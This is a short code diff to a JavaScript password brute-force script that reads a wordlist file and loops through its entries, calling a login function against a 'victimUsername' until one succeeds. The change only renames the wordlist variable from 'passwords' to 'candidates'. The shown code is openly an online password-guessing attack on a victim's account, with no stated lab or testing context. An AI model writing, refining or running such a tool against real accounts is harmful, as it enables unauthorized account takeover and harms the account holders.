@@ -8,7 +8,7 @@ const myPassword = "";
 const victimUsername = "";
 const inputFile = "";
 
-const passwords = fs.readFileSync(inputFile, "utf-8").split("\n");
+const candidates = fs.readFileSync(inputFile, "utf-8").split("\n");
 
 async function login(username, password) {
   try {
@@ -32,8 +32,8 @@ async function login(username, password) {
 
 // Function to attempt login
 async function bruteForce() {
-  for (let i = 0; i < passwords.length; i++) {
-    passwordToTry = passwords[i].trim();
+  for (let i = 0; i < candidates.length; i++) {
+    passwordToTry = candidates[i].trim();
     const success = await login(victimUsername, passwordToTry);
     if (success) {
       return;
